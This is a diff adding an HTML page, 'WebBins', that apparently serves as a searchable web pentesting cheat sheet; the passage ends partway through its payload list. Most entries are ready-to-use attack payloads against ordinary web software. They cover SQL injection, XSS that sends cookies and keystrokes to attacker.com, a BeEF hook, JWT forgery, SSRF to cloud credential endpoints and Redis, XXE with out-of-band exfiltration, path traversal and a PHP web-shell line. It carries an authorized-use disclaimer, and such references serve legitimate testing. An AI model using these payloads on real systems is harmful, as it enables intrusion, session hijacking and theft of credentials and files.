@@ -1,0 +1,1038 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WebBins — Web App Pentesting Reference</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --surface: #111418;
+    --surface2: #181c22;
+    --border: #1e242e;
+    --border-hover: #2e3a4a;
+    --accent: #00d4ff;
+    --accent2: #ff6b35;
+    --accent3: #7fff6b;
+    --text: #c8d6e5;
+    --text-muted: #5a6a7e;
+    --text-dim: #3a4a5e;
+    --tag-bg: #0d1520;
+    --tag-border: #1a2840;
+    --tag-text: #6b9fc8;
+    --glow: rgba(0, 212, 255, 0.08);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Syne', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Subtle grid background */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,212,255,0.02) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,212,255,0.02) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 0 24px;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* Header */
+  header {
+    padding: 48px 0 32px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .header-inner {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    gap: 24px;
+    flex-wrap: wrap;
+  }
+
+  .logo-area h1 {
+    font-size: 2.6rem;
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .logo-icon {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 40px;
+    height: 40px;
+    background: linear-gradient(135deg, var(--accent), #0088cc);
+    border-radius: 8px;
+    font-size: 1.1rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-weight: 700;
+    color: #000;
+    flex-shrink: 0;
+    box-shadow: 0 0 20px rgba(0,212,255,0.3);
+  }
+
+  .logo-accent { color: var(--accent); }
+
+  .tagline {
+    margin-top: 8px;
+    color: var(--text-muted);
+    font-size: 0.95rem;
+    font-weight: 400;
+    max-width: 480px;
+    line-height: 1.5;
+  }
+
+  .disclaimer {
+    margin-top: 16px;
+    padding: 10px 14px;
+    background: rgba(255,107,53,0.06);
+    border: 1px solid rgba(255,107,53,0.15);
+    border-radius: 6px;
+    font-size: 0.8rem;
+    color: rgba(255,107,53,0.8);
+    max-width: 600px;
+    line-height: 1.5;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .stats-badge {
+    display: flex;
+    gap: 16px;
+    flex-shrink: 0;
+    align-self: flex-start;
+    margin-top: 8px;
+  }
+
+  .stat {
+    text-align: center;
+    padding: 12px 18px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+  }
+
+  .stat-num {
+    display: block;
+    font-size: 1.6rem;
+    font-weight: 800;
+    color: var(--accent);
+    font-family: 'JetBrains Mono', monospace;
+    line-height: 1;
+  }
+
+  .stat-label {
+    display: block;
+    font-size: 0.7rem;
+    color: var(--text-muted);
+    margin-top: 4px;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+  }
+
+  /* Search */
+  .search-area {
+    padding: 28px 0 20px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: var(--bg);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .search-wrap {
+    position: relative;
+  }
+
+  .search-icon {
+    position: absolute;
+    left: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--text-muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.85rem;
+    pointer-events: none;
+    user-select: none;
+  }
+
+  #searchInput {
+    width: 100%;
+    padding: 14px 16px 14px 48px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.9rem;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  #searchInput:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(0,212,255,0.08), 0 0 20px rgba(0,212,255,0.05);
+  }
+
+  #searchInput::placeholder { color: var(--text-muted); }
+
+  .search-hint {
+    position: absolute;
+    right: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 0.75rem;
+    color: var(--text-dim);
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  /* Category filter pills */
+  .filter-bar {
+    padding: 16px 0 12px;
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    align-items: center;
+  }
+
+  .filter-label {
+    font-size: 0.75rem;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    font-family: 'JetBrains Mono', monospace;
+    margin-right: 4px;
+  }
+
+  .filter-pill {
+    padding: 5px 12px;
+    background: var(--tag-bg);
+    border: 1px solid var(--tag-border);
+    border-radius: 4px;
+    font-size: 0.78rem;
+    color: var(--tag-text);
+    cursor: pointer;
+    font-family: 'JetBrains Mono', monospace;
+    transition: all 0.15s;
+    user-select: none;
+  }
+
+  .filter-pill:hover, .filter-pill.active {
+    background: rgba(0,212,255,0.1);
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+
+  .filter-pill.active {
+    box-shadow: 0 0 8px rgba(0,212,255,0.2);
+  }
+
+  /* Table */
+  .table-wrap {
+    padding: 8px 0 80px;
+  }
+
+  .table-header {
+    display: grid;
+    grid-template-columns: 280px 1fr;
+    gap: 0;
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 4px;
+  }
+
+  .th {
+    font-size: 0.7rem;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    color: var(--text-muted);
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  /* Entry rows */
+  .entry {
+    display: grid;
+    grid-template-columns: 280px 1fr;
+    gap: 0;
+    border: 1px solid transparent;
+    border-radius: 6px;
+    margin-bottom: 2px;
+    transition: all 0.15s;
+    cursor: pointer;
+    overflow: hidden;
+  }
+
+  .entry:hover {
+    border-color: var(--border-hover);
+    background: var(--surface);
+  }
+
+  .entry:hover .entry-title-cell {
+    color: var(--accent);
+  }
+
+  .entry-title-cell {
+    padding: 14px 16px;
+    font-size: 0.9rem;
+    font-weight: 600;
+    color: #7eb8d4;
+    transition: color 0.15s;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border-right: 1px solid var(--border);
+    text-decoration: none;
+  }
+
+  .entry-title-cell .cat-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+
+  .entry-tags-cell {
+    padding: 12px 16px;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    align-items: center;
+  }
+
+  .tag {
+    padding: 3px 9px;
+    background: var(--tag-bg);
+    border: 1px solid var(--tag-border);
+    border-radius: 3px;
+    font-size: 0.72rem;
+    color: var(--tag-text);
+    font-family: 'JetBrains Mono', monospace;
+    white-space: nowrap;
+    cursor: pointer;
+    transition: all 0.12s;
+    user-select: none;
+  }
+
+  .tag:hover {
+    background: rgba(0,212,255,0.08);
+    border-color: rgba(0,212,255,0.3);
+    color: var(--accent);
+  }
+
+  .tag.highlight {
+    background: rgba(0,212,255,0.12);
+    border-color: rgba(0,212,255,0.4);
+    color: var(--accent);
+  }
+
+  /* Modal / command view */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.8);
+    z-index: 1000;
+    backdrop-filter: blur(4px);
+    animation: fadeIn 0.15s ease;
+  }
+
+  .modal-overlay.open { display: flex; align-items: center; justify-content: center; padding: 24px; }
+
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+  @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+  .modal {
+    background: var(--surface);
+    border: 1px solid var(--border-hover);
+    border-radius: 12px;
+    width: 100%;
+    max-width: 760px;
+    max-height: 90vh;
+    overflow-y: auto;
+    animation: slideUp 0.2s ease;
+    box-shadow: 0 32px 80px rgba(0,0,0,0.8), 0 0 0 1px rgba(0,212,255,0.05);
+  }
+
+  .modal-header {
+    padding: 24px 24px 20px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    gap: 16px;
+    position: sticky;
+    top: 0;
+    background: var(--surface);
+    z-index: 1;
+  }
+
+  .modal-title {
+    font-size: 1.4rem;
+    font-weight: 800;
+    color: #fff;
+    letter-spacing: -0.02em;
+  }
+
+  .modal-close {
+    width: 32px;
+    height: 32px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--text-muted);
+    cursor: pointer;
+    font-size: 1.1rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    transition: all 0.15s;
+  }
+
+  .modal-close:hover { border-color: var(--accent); color: var(--accent); }
+
+  .modal-body { padding: 24px; }
+
+  .modal-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    margin-bottom: 24px;
+  }
+
+  .modal-desc {
+    font-size: 0.9rem;
+    color: var(--text-muted);
+    line-height: 1.6;
+    margin-bottom: 24px;
+  }
+
+  .cmd-block {
+    margin-bottom: 20px;
+  }
+
+  .cmd-label {
+    font-size: 0.72rem;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--text-muted);
+    font-family: 'JetBrains Mono', monospace;
+    margin-bottom: 8px;
+  }
+
+  .cmd-code {
+    position: relative;
+    background: #080b0f;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 14px 16px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82rem;
+    color: #a8d8b0;
+    line-height: 1.6;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow: hidden;
+  }
+
+  .cmd-code .kw { color: var(--accent); }
+  .cmd-code .flag { color: #ffb347; }
+  .cmd-code .str { color: #98d082; }
+  .cmd-code .comment { color: var(--text-dim); font-style: italic; }
+
+  .copy-btn {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    padding: 4px 10px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    font-size: 0.7rem;
+    color: var(--text-muted);
+    cursor: pointer;
+    font-family: 'JetBrains Mono', monospace;
+    transition: all 0.15s;
+  }
+
+  .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
+  .copy-btn.copied { border-color: var(--accent3); color: var(--accent3); }
+
+  .notes-block {
+    padding: 14px;
+    background: rgba(0,212,255,0.04);
+    border: 1px solid rgba(0,212,255,0.1);
+    border-radius: 6px;
+    font-size: 0.83rem;
+    color: var(--text-muted);
+    line-height: 1.6;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .notes-block strong { color: var(--accent); }
+
+  /* No results */
+  .no-results {
+    padding: 60px 0;
+    text-align: center;
+    color: var(--text-muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.9rem;
+    display: none;
+  }
+
+  .no-results span { color: var(--accent); }
+
+  .result-count {
+    font-size: 0.75rem;
+    color: var(--text-muted);
+    font-family: 'JetBrains Mono', monospace;
+    padding: 8px 0 12px;
+  }
+
+  .result-count em { color: var(--accent); font-style: normal; }
+
+  /* Category dot colors */
+  .dot-injection { background: #ff6b6b; }
+  .dot-auth { background: #ffd93d; }
+  .dot-recon { background: #6bcbff; }
+  .dot-xxe { background: #ff9f43; }
+  .dot-ssrf { background: #a55eea; }
+  .dot-file { background: #26de81; }
+  .dot-crypto { background: #fd79a8; }
+  .dot-misc { background: #74b9ff; }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border-hover); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--text-dim); }
+
+  @media (max-width: 640px) {
+    .entry { grid-template-columns: 1fr; }
+    .entry-title-cell { border-right: none; border-bottom: 1px solid var(--border); }
+    .table-header { display: none; }
+    .stats-badge { display: none; }
+    .logo-area h1 { font-size: 1.8rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <header>
+    <div class="header-inner">
+      <div class="logo-area">
+        <h1>
+          <span class="logo-icon">W</span>
+          <span>Web<span class="logo-accent">Bins</span></span>
+        </h1>
+        <p class="tagline">Quick-reference commands and payloads for web application penetration testing. Searchable. Organized. Practical.</p>
+        <div class="disclaimer">⚠ For authorized pentesting and security research only. All activities must comply with applicable laws and require explicit written permission.</div>
+      </div>
+      <div class="stats-badge">
+        <div class="stat">
+          <span class="stat-num" id="totalEntries">0</span>
+          <span class="stat-label">Techniques</span>
+        </div>
+        <div class="stat">
+          <span class="stat-num" id="totalTags">0</span>
+          <span class="stat-label">Tags</span>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="search-area">
+    <div class="search-wrap">
+      <span class="search-icon">⌕</span>
+      <input type="text" id="searchInput" placeholder="Search techniques, tools, payloads, tags..." autocomplete="off" spellcheck="false">
+      <span class="search-hint" id="searchHint"></span>
+    </div>
+  </div>
+
+  <div class="filter-bar">
+    <span class="filter-label">Filter:</span>
+    <span class="filter-pill active" data-cat="all">All</span>
+    <span class="filter-pill" data-cat="Injection">Injection</span>
+    <span class="filter-pill" data-cat="Authentication">Auth</span>
+    <span class="filter-pill" data-cat="Recon">Recon</span>
+    <span class="filter-pill" data-cat="SSRF">SSRF</span>
+    <span class="filter-pill" data-cat="XXE">XXE</span>
+    <span class="filter-pill" data-cat="File">File</span>
+    <span class="filter-pill" data-cat="Crypto">Crypto</span>
+    <span class="filter-pill" data-cat="Misc">Misc</span>
+  </div>
+
+  <div class="table-wrap">
+    <div class="result-count" id="resultCount"></div>
+    <div class="table-header">
+      <div class="th">Title</div>
+      <div class="th">Tags</div>
+    </div>
+    <div id="entriesList"></div>
+    <div class="no-results" id="noResults">No results for "<span id="noResultsQuery"></span>"</div>
+  </div>
+</div>
+
+<!-- Modal -->
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal" id="modal">
+    <div class="modal-header">
+      <div class="modal-title" id="modalTitle"></div>
+      <button class="modal-close" id="modalClose">✕</button>
+    </div>
+    <div class="modal-body" id="modalBody"></div>
+  </div>
+</div>
+
+<script>
+const DATA = [
+  {
+    title: "SQL Injection — Error-Based",
+    category: "Injection",
+    dotClass: "dot-injection",
+    tags: ["SQLi", "Error-Based", "MySQL", "MSSQL", "Oracle", "Database", "Burp Suite"],
+    desc: "Extract data via database error messages. Useful when application reflects DB errors in the HTTP response.",
+    commands: [
+      { label: "MySQL — extract version via error", code: `' AND extractvalue(1,concat(0x7e,version())) -- -` },
+      { label: "MSSQL — error-based extraction", code: `' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) -- -` },
+      { label: "Oracle — XMLType extraction", code: `' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)) -- -` },
+      { label: "MySQL — dump users (sqlmap)", code: `sqlmap -u "https://target.com/page?id=1" --dbms=mysql --users --passwords --batch` },
+    ],
+    notes: "<strong>Tip:</strong> Use --level 5 --risk 3 with sqlmap for thorough detection. Always confirm injectable parameter manually first with a single-quote test."
+  },
+  {
+    title: "SQL Injection — UNION-Based",
+    category: "Injection",
+    dotClass: "dot-injection",
+    tags: ["SQLi", "UNION", "MySQL", "PostgreSQL", "Column Enumeration", "Data Extraction"],
+    desc: "Leverage UNION SELECT to append attacker-controlled query results to the original response.",
+    commands: [
+      { label: "Determine column count", code: `' ORDER BY 1 -- -\n' ORDER BY 2 -- -\n' ORDER BY 3 -- -  <-- error here = 2 cols` },
+      { label: "Find string-compatible columns", code: `' UNION SELECT NULL,NULL,'test' -- -` },
+      { label: "Extract DB version & user", code: `' UNION SELECT version(),current_user(),NULL -- -` },
+      { label: "Read local file (MySQL)", code: `' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL -- -` },
+    ],
+    notes: "<strong>Tip:</strong> Number of NULLs must match the original query's column count. Use GROUP_CONCAT() to fit multiple rows into one column."
+  },
+  {
+    title: "SQL Injection — Blind (Boolean)",
+    category: "Injection",
+    dotClass: "dot-injection",
+    tags: ["SQLi", "Blind", "Boolean", "Out-of-Band", "Time-Based", "Automation"],
+    desc: "Infer database contents one bit at a time based on true/false application responses.",
+    commands: [
+      { label: "Conditional true/false test", code: `' AND 1=1 -- -   (page loads normally)\n' AND 1=2 -- -   (page changes = blind injectable)` },
+      { label: "Extract char by char (MySQL)", code: `' AND SUBSTRING((SELECT database()),1,1)='a' -- -` },
+      { label: "Time-based blind (MySQL)", code: `' AND SLEEP(5) -- -` },
+      { label: "Time-based blind (MSSQL)", code: `'; WAITFOR DELAY '0:0:5' -- -` },
+      { label: "sqlmap blind enumeration", code: `sqlmap -u "https://target.com/?id=1" --technique=BT --dbs --batch` },
+    ],
+    notes: "<strong>Tip:</strong> For WAF bypass, try encoding: URL-encode, double URL-encode, case variation, comment injection (/*!SELECT*/)."
+  },
+  {
+    title: "XSS — Reflected",
+    category: "Injection",
+    dotClass: "dot-injection",
+    tags: ["XSS", "Reflected", "JavaScript", "Content-Type", "CSP Bypass", "Payload"],
+    desc: "Inject scripts that execute in the victim's browser via URL parameters or form inputs.",
+    commands: [
+      { label: "Basic test payload", code: `<script>alert(document.domain)</script>` },
+      { label: "Attribute context escape", code: `" onmouseover="alert(1)` },
+      { label: "Event handler (no angle brackets needed)", code: `javascript:alert(document.cookie)` },
+      { label: "SVG-based payload", code: `<svg onload=alert(document.cookie)>` },
+      { label: "Cookie steal via XSS", code: `<script>fetch('https://attacker.com/?c='+btoa(document.cookie))</script>` },
+      { label: "CSP bypass via JSONP endpoint", code: `<script src="https://target.com/api/jsonp?callback=alert(1)//"></script>` },
+    ],
+    notes: "<strong>Tool:</strong> Use Burp Suite's Intruder or XSStrike for automated payload fuzzing. Check Content-Security-Policy header before crafting payloads."
+  },
+  {
+    title: "XSS — Stored",
+    category: "Injection",
+    dotClass: "dot-injection",
+    tags: ["XSS", "Stored", "Persistent", "Session Hijacking", "BeEF", "JavaScript"],
+    desc: "Payloads written to the database and served to all subsequent viewers — higher severity than reflected.",
+    commands: [
+      { label: "Session hijack payload", code: `<script>\nnew Image().src='https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie);\n</script>` },
+      { label: "Keylogger injection", code: `<script>\ndocument.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)}\n</script>` },
+      { label: "BeEF hook injection", code: `<script src="http://attacker.com:3000/hook.js"></script>` },
+      { label: "Polyglot XSS", code: `jaVasCript:/*-/*\\`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e` },
+    ],
+    notes: "<strong>Impact:</strong> Stored XSS in admin panel = account takeover. Always escalate by hooking with BeEF or stealing admin session tokens."
+  },
+  {
+    title: "JWT Attacks",
+    category: "Authentication",
+    dotClass: "dot-auth",
+    tags: ["JWT", "Authentication", "Algorithm Confusion", "alg:none", "kid Header", "Brute Force", "Burp Suite"],
+    desc: "Attack JSON Web Tokens by exploiting weak secrets, algorithm confusion, or header injection.",
+    commands: [
+      { label: "Brute force HS256 secret (jwt_tool)", code: `jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt` },
+      { label: "alg:none attack", code: `jwt_tool <token> -X a` },
+      { label: "RS256 → HS256 confusion attack", code: `jwt_tool <token> -K -pk public.pem -T` },
+      { label: "kid header path traversal", code: `# Set kid to: ../../dev/null\n# Sign with empty string as secret\njwt_tool <token> -I -hc kid -hv "../../dev/null" -S hs256 -p ""` },
+      { label: "Decode + inspect token", code: `jwt_tool <token> -d` },
+      { label: "Forge arbitrary claims", code: `jwt_tool <token> -T  # Tamper mode — interactive` },
+    ],
+    notes: "<strong>Burp:</strong> Use the JWT Editor extension. Check for weak secrets first with -C, then try algorithm confusion, then kid injection."
+  },
+  {
+    title: "IDOR — Insecure Direct Object Reference",
+    category: "Authentication",
+    dotClass: "dot-auth",
+    tags: ["IDOR", "Authorization", "Object Reference", "Horizontal Privilege Escalation", "Burp Autorize", "API"],
+    desc: "Access or modify objects belonging to other users by manipulating identifiers in requests.",
+    commands: [
+      { label: "Basic IDOR test (Burp Repeater)", code: `GET /api/users/1337/profile HTTP/1.1\nAuthorization: Bearer <your_token>\n\n# Change 1337 to another user's ID` },
+      { label: "Mass enumerate IDs (ffuf)", code: `ffuf -u "https://target.com/api/user/FUZZ/data" \\\n  -H "Authorization: Bearer <token>" \\\n  -w <(seq 1 10000) \\\n  -mc 200 -o idor_results.json` },
+      { label: "IDOR in file download", code: `GET /download?file=invoice_1001.pdf\n# Try: invoice_1000.pdf, invoice_1002.pdf, etc.` },
+      { label: "GUIDs — harvest from JS/API responses", code: `# Search responses for UUID patterns:\ngrep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' response.txt` },
+    ],
+    notes: "<strong>Burp Autorize:</strong> Install the Autorize extension, add low-priv cookie, browse as admin — it auto-detects IDOR/privilege escalation."
+  },
+  {
+    title: "Broken Access Control",
+    category: "Authentication",
+    dotClass: "dot-auth",
+    tags: ["Access Control", "Privilege Escalation", "Forced Browsing", "Authorization", "Burp AuthMatrix", "Roles"],
+    desc: "Test vertical and horizontal access control by accessing admin/elevated functions with lower-privileged accounts.",
+    commands: [
+      { label: "Force browse admin paths (feroxbuster)", code: `feroxbuster -u https://target.com/admin \\\n  -H "Cookie: session=<low_priv_cookie>" \\\n  -w /usr/share/seclists/Discovery/Web-Content/common.txt` },
+      { label: "HTTP method override", code: `POST /admin/deleteUser HTTP/1.1\nX-HTTP-Method-Override: DELETE` },
+      { label: "Parameter-based privilege escalation", code: `POST /api/updateProfile\n{"username":"user","role":"admin"}  # Add role param` },
+      { label: "Path traversal to admin function", code: `GET /api/v1/users/../admin/allUsers\nGET /api/v1/users/%2e%2e/admin/allUsers` },
+    ],
+    notes: "<strong>Burp AuthMatrix:</strong> Map all endpoints and roles in a matrix to systematically identify missing authorization checks."
+  },
+  {
+    title: "SSRF — Server-Side Request Forgery",
+    category: "SSRF",
+    dotClass: "dot-ssrf",
+    tags: ["SSRF", "Cloud Metadata", "AWS", "Internal Network", "Blind SSRF", "Redirects", "Gopher"],
+    desc: "Force the server to make requests to internal services or cloud metadata endpoints.",
+    commands: [
+      { label: "AWS metadata (IMDSv1)", code: `http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/` },
+      { label: "GCP metadata", code: `http://metadata.google.internal/computeMetadata/v1/\n# Requires: Metadata-Flavor: Google header` },
+      { label: "Azure IMDS", code: `http://169.254.169.254/metadata/instance?api-version=2021-02-01\n# Requires: Metadata: true header` },
+      { label: "Internal port scan via SSRF", code: `# Fuzz port param with Burp Intruder\nhttp://127.0.0.1:§80§/\n# Ports to try: 22,80,443,8080,8443,3306,5432,6379,27017` },
+      { label: "Gopher protocol — SSRF to Redis RCE", code: `gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...` },
+      { label: "Bypass localhost filters", code: `http://0.0.0.0/\nhttp://0177.0.0.1/  # Octal\nhttp://0x7f000001/  # Hex\nhttp://[::1]/        # IPv6` },
+    ],
+    notes: "<strong>Blind SSRF:</strong> Use Burp Collaborator or interactsh to detect out-of-band DNS/HTTP callbacks."
+  },
+  {
+    title: "XXE — XML External Entity",
+    category: "XXE",
+    dotClass: "dot-xxe",
+    tags: ["XXE", "XML", "File Read", "SSRF", "Blind XXE", "OOB", "DTD"],
+    desc: "Exploit XML parsers to read local files, perform SSRF, or exfiltrate data out-of-band.",
+    commands: [
+      { label: "Basic file read", code: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>` },
+      { label: "Blind XXE via OOB DNS (Burp Collaborator)", code: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR.net/">\n]>\n<root>&xxe;</root>` },
+      { label: "Blind XXE — exfil via OOB HTTP", code: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM "file:///etc/passwd">\n  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">\n  %dtd;\n]>` },
+      { label: "evil.dtd content (hosted on attacker server)", code: `<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">\n%all;` },
+      { label: "XXE via SVG file upload", code: `<?xml version="1.0"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n]>\n<svg>&xxe;</svg>` },
+    ],
+    notes: "<strong>Tip:</strong> Test any endpoint that accepts XML, SOAP, SVG uploads, or Office documents. Try changing Content-Type to application/xml."
+  },
+  {
+    title: "Directory & Content Discovery",
+    category: "Recon",
+    dotClass: "dot-recon",
+    tags: ["Recon", "Fuzzing", "ffuf", "feroxbuster", "gobuster", "wordlists", "SecLists"],
+    desc: "Enumerate hidden paths, files, and API endpoints on web applications.",
+    commands: [
+      { label: "ffuf — directory fuzzing", code: `ffuf -u https://target.com/FUZZ \\\n  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \\\n  -mc 200,301,302,403 -t 50` },
+      { label: "ffuf — file extension fuzzing", code: `ffuf -u https://target.com/FUZZ \\\n  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \\\n  -e .php,.asp,.aspx,.bak,.txt,.conf \\\n  -mc 200,301,302` },
+      { label: "feroxbuster — recursive", code: `feroxbuster -u https://target.com \\\n  -w /usr/share/seclists/Discovery/Web-Content/common.txt \\\n  --depth 3 --threads 50 -x php,html,txt,bak` },
+      { label: "gobuster — vhost discovery", code: `gobuster vhost -u https://target.com \\\n  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \\\n  --append-domain` },
+    ],
+    notes: "<strong>Wordlists:</strong> Use raft-large for comprehensive coverage. Try api_endpoints.txt from SecLists for API paths. Always add -H 'Cookie: session=...' if auth is required."
+  },
+  {
+    title: "Subdomain Enumeration",
+    category: "Recon",
+    dotClass: "dot-recon",
+    tags: ["Recon", "Subdomain", "amass", "subfinder", "dnsx", "httpx", "ASN", "Certificate Transparency"],
+    desc: "Discover subdomains to expand the attack surface before active testing begins.",
+    commands: [
+      { label: "subfinder passive enumeration", code: `subfinder -d target.com -all -recursive -o subs.txt` },
+      { label: "amass passive", code: `amass enum -passive -d target.com -o amass_subs.txt` },
+      { label: "Resolve + filter live (dnsx + httpx)", code: `cat subs.txt | dnsx -silent | httpx -silent -o live_subs.txt` },
+      { label: "Certificate transparency (crt.sh)", code: `curl -s "https://crt.sh/?q=%.target.com&output=json" | \\\n  jq -r '.[].name_value' | sort -u` },
+      { label: "ASN range discovery", code: `amass intel -org "Target Corp" -max-dns-queries 2500` },
+    ],
+    notes: "<strong>Pipeline:</strong> subfinder → dnsx → httpx → nuclei. This gives you live subdomains ready for vuln scanning in one automated chain."
+  },
+  {
+    title: "API Security Testing",
+    category: "Recon",
+    dotClass: "dot-recon",
+    tags: ["API", "REST", "GraphQL", "Swagger", "Postman", "ffuf", "Versioning", "Mass Assignment"],
+    desc: "Discover and test API endpoints for common vulnerabilities including mass assignment, broken function-level auth, and versioning issues.",
+    commands: [
+      { label: "API endpoint discovery (ffuf)", code: `ffuf -u https://api.target.com/FUZZ \\\n  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \\\n  -mc 200,201,400,401,403 -t 40` },
+      { label: "API version fuzzing", code: `ffuf -u https://target.com/api/vFUZZ/users \\\n  -w <(seq 1 10) -mc 200,401,403` },
+      { label: "GraphQL introspection", code: `curl -X POST https://target.com/graphql \\\n  -H "Content-Type: application/json" \\\n  -d '{"query":"{ __schema { types { name fields { name } } } }"}'` },
+      { label: "GraphQL field suggestion abuse", code: `{"query":"{ user { id username passwor } }"}\n# Look for 'Did you mean: password?' in errors` },
+      { label: "Mass assignment test", code: `PATCH /api/user/profile\n{"username":"user","isAdmin":true,"role":"superuser"}` },
+    ],
+    notes: "<strong>Tools:</strong> Use Postman to import Swagger/OpenAPI specs for rapid endpoint mapping. GraphQL Voyager for schema visualization."
+  },
+  {
+    title: "Path Traversal / LFI",
+    category: "File",
+    dotClass: "dot-file",
+    tags: ["LFI", "Path Traversal", "File Read", "RFI", "Log Poisoning", "PHP Wrappers"],
+    desc: "Read arbitrary files from the server filesystem or include remote files for code execution.",
+    commands: [
+      { label: "Basic traversal sequences", code: `../../../etc/passwd\n..%2F..%2F..%2Fetc%2Fpasswd\n....//....//....//etc/passwd\n%252e%252e%252fetc%252fpasswd` },
+      { label: "PHP wrapper — base64 file read", code: `php://filter/convert.base64-encode/resource=/etc/passwd\n# Decode: echo <base64> | base64 -d` },
+      { label: "PHP wrapper — RCE via input", code: `php://input\n# POST body: <?php system($_GET['cmd']); ?>` },
